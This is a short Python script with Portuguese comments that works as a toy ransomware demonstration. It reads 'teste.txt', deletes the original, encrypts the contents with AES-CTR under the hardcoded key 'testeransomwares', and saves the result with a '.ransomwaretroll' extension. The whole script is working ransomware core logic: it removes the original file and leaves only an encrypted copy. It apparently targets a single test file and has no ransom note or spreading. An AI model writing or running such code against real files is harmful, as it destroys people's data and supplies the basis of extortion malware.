import os
import pyaes

# Nome do arquivo a ser criptografado
file_name = "teste.txt"

# Verificar se o arquivo existe
if not os.path.isfile(file_name):
    print(f"O arquivo {file_name} não existe!")
    exit()

# Abrir e ler o arquivo com 'with' para garantir fechamento automático
with open(file_name, "rb") as file:
    file_data = file.read()

# Remover o arquivo original
os.remove(file_name)

# Chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

# Criptografar o arquivo
crypto_data = aes.encrypt(file_data)

# Salvar o arquivo criptografado com um nome modificado
encrypted_file_name = f"{file_name}.ransomwaretroll"
with open(encrypted_file_name, 'wb') as new_file:
    new_file.write(crypto_data)

print(f"Arquivo criptografado e salvo como {encrypted_file_name}")
